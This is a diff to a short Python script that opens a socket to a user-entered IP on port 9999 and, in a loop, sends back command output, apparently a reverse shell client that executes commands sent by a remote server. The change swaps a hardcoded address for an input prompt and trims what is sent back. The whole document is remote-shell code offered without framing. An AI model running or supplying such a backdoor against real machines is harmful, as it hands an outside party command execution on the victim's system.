@@ -3,10 +3,11 @@ import os
 import subprocess
 
 skt = socket.socket()
-# change this IP address to server ip address.
-host ="192.168.0.1"
+
+host =input("Enter IP address: ")
 port = 9999
 
+print("\nConnecting to "+ str(host)+" .....")
 skt.connect((host, port))
 
 while True:
@@ -20,9 +21,6 @@ while True:
 
         currentWD = os.getcwd() + " >> "
 
-        skt.send(str.encode(output_string +"\n"+currentWD))
-
-        print(str(output_string))
-
+        skt.send(str.encode(output_string))
 
 
